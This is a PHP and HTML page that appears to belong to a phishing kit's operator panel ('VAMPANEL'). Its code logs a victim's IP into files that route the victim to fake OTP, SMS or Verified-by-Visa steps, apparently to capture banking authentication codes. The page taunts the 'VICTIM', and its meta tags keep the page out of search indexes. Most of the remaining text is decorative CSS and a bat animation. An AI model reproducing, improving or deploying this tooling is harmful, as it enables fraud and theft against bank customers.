<?php

if (isset($_GET['ip'])) {

    $ip = $_GET['ip'];
    $view = $_GET['view'];

    function putAction($filename, $ip) {
        file_put_contents($filename, $ip . PHP_EOL, FILE_APPEND);
    }

    switch ($view) {
        case 'otp':
            $filename = 'ip_badotp.txt';
            putAction($filename, $ip);
            break;
        case 'badotp':
            $filename = 'ip_badotp.txt';
            putAction($filename, $ip);
            break;
        case 'sms':
            $filename = 'ip_sms.txt';
            putAction($filename, $ip);
                break;
        case 'badsms':
            $filename = 'ip_badsms.txt';
            putAction($filename, $ip);
            break;
        case 'confirm':
            $filename = 'ip_confirm.txt';
            putAction($filename, $ip);
            break;
        case 'vbv':
            $filename = 'ip_vbv.txt';
            putAction($filename, $ip);
            break;
        case 'badvbv':
            $filename = 'ip_badvbv.txt';
            putAction($filename, $ip);
            break;
        default:
            die("HTTP/1.0 404 Not Found" );
            break;
    }

    

}

?>
    <!DOCTYPE html>
    <html lang="fr">

    <head>
    <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="robots" content="noindex, nofollow, noimageindex, noarchive, nocache, nosnippet">
        <title>VAMPANEL - ACTION</title>

        <link rel="shortcut icon" href="../assets/favicon.ico" type="image/x-icon">
        <link rel="stylesheet" href="../assets/css/master.css">
    </head>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto:wght@400;700&display=swap');
        html, body {
            height: 100%;
            margin: 0;
            padding: 0;
            background: #0a0a0a;
            color: #fff;
            font-family: 'Roboto', 'Orbitron', Arial, sans-serif;
            overflow: hidden;
        }
        #particles-js {
            position: fixed;
            top: 0; left: 0; width: 100vw; height: 100vh;
            z-index: 0;
        }
        .nav {
            width: 100vw;
            height: 120px;
            background: linear-gradient(90deg, #1a0000 0%, #ff003c 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 32px #ff003c44;
            border-bottom: 2px solid #ff003c;
        }
        .nav img {
            height: 60px;
            margin: 0 16px;
            filter: drop-shadow(0 0 8px #ff003c);
        }
        main {
            min-height: calc(100vh - 120px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1;
            position: relative;
        }
        .content {
            background: rgba(20,0,0,0.92);
            border: 2px solid #ff003c;
            border-radius: 18px;
            box-shadow: 0 0 32px #ff003c55, 0 0 4px #000;
            padding: 40px 32px 32px 32px;
            margin: 0 16px;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-width: 320px;
            max-width: 90vw;
        }
        .ip-block {
            font-family: 'Orbitron', monospace;
            font-size: 2.2rem;
            color: #ff003c;
            background: #181818;
            border-radius: 10px;
            padding: 18px 32px;
            margin-bottom: 32px;
            box-shadow: 0 0 16px #ff003c99, 0 0 2px #fff2;
            letter-spacing: 2px;
            text-shadow: 0 0 8px #ff003c, 0 0 2px #fff2;
        }
        .action-msg {
            color: #fff;
            font-size: 1.3rem;
            font-family: 'Roboto', Arial, sans-serif;
            margin-top: 0;
            margin-bottom: 0;
            text-align: center;
            letter-spacing: 1px;
            text-shadow: 0 0 8px #ff003c99;
        }
        .glow {
            color: #ff003c;
            text-shadow: 0 0 8px #ff003c, 0 0 16px #ff003c99;
        }
        @media (max-width: 600px) {
            .content { padding: 18px 4vw; min-width: 0; }
            .ip-block { font-size: 1.1rem; padding: 10px 8px; }
        }
        .vampire-logo {
            font-family: 'Orbitron', 'Roboto', Arial, sans-serif;
            font-size: 2.8rem;
            font-weight: 900;
            letter-spacing: 8px;
            user-select: none;
            display: inline-block;
            vertical-align: middle;
            margin-left: 18px;
            margin-right: 18px;
            background: linear-gradient(270deg, #ff003c, #fffb00, #00ffea, #ff003c, #fffb00, #00ffea);
            background-size: 1200% 1200%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-fill-color: transparent;
            animation: rgbglow 4s linear infinite;
            text-shadow: 0 0 24px #fff, 0 0 32px #ff003c99, 0 0 2px #fff2;
            filter: brightness(1.2) drop-shadow(0 0 8px #fff) drop-shadow(0 0 16px #ff003c);
        }
        @keyframes rgbglow {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        @media (max-width: 600px) {
            .vampire-logo { font-size: 1.3rem; letter-spacing: 3px; margin-left: 6px; margin-right: 6px; }
        }
        #bats {
            position: fixed;
            top: 0; left: 0; width: 100vw; height: 100vh;
            pointer-events: none;
            z-index: 0;
        }
        /* Ne pas redéfinir .bat ici, utiliser master.css */
    </style>

    <body>
    <div id="bats"></div>
    <div class="nav">
        <span class="vampire-logo">VAMPIRE</span>
        <img class="imaga" src="https://media.tenor.com/5Vcv84Ftrk8AAAAj/akm-ak-47.gif" alt="Hacker">
    </div>
    <main>
        <div class="content">
            <div class="ip-block">
                VICTIM Fuckd to : <span class="glow"><?php echo htmlspecialchars($_GET['ip'] ?? ''); ?></span>
            </div>
            <h3 class="action-msg">ACTION EFFECTUÉE<br><span class="glow">Vérifiez le résultat !</span></h3>
        </div>
    </main>
    <script>
    // --- Chauves-souris animées en <div class="bat"> avec style CSS natif ---
    const BAT_COUNT = 18;
    const batsDiv = document.getElementById('bat');
    let width = window.innerWidth;
    let height = window.innerHeight;
    let mouse = {x: width/2, y: height/2};
    window.addEventListener('resize', () => {
        width = window.innerWidth;
        height = window.innerHeight;
    });
    document.addEventListener('mousemove', e => {
        mouse.x = e.clientX;
        mouse.y = e.clientY;
    });
    function rand(a, b) { return a + Math.random() * (b - a); }
    class Bat {
        constructor(el) {
            this.el = el;
            this.x = rand(0, width);
            this.y = rand(0, height);
            this.vx = rand(-2, 2);
            this.vy = rand(-2, 2);
            this.size = rand(0.85, 1.15);
            this.wing = rand(0, Math.PI*2);
        }
        update() {
            let dx = this.x - mouse.x;
            let dy = this.y - mouse.y;
            let dist = Math.sqrt(dx*dx + dy*dy);
            if (dist < 120) {
                this.vx += dx/dist * 1.2;
                this.vy += dy/dist * 1.2;
            }
            this.vx += rand(-0.2, 0.2);
            this.vy += rand(-0.2, 0.2);
            this.vx *= 0.96;
            this.vy *= 0.96;
            this.x += this.vx;
            this.y += this.vy;
            if (this.x < 0) { this.x = 0; this.vx *= -1; }
            if (this.x > width-48) { this.x = width-48; this.vx *= -1; }
            if (this.y < 0) { this.y = 0; this.vy *= -1; }
            if (this.y > height-32) { this.y = height-32; this.vy *= -1; }
            this.wing += 0.18 + rand(0,0.05);
        }
        draw() {
            this.el.style.left = this.x + 'px';
            this.el.style.top = this.y + 'px';
            // Animation battement d'ailes (rotation)
            let rot = Math.sin(this.wing) * 12;
            this.el.style.transform = `scale(${this.size}) rotate(${rot}deg)`;
        }
    }
    let bats = [];
    for (let i=0; i<BAT_COUNT; i++) {
        let el = document.createElement('div');
        el.className = 'bat';
        el.style.position = 'absolute';
        el.style.width = '1px';
        el.style.height = '1px';
        batsDiv.appendChild(el);
        bats.push(new Bat(el));
    }
    function animate() {
        for (let bat of bats) {
            bat.update();
            bat.draw();
        }
        requestAnimationFrame(animate);
    }
    animate();
    </script>
    </body>

    </html>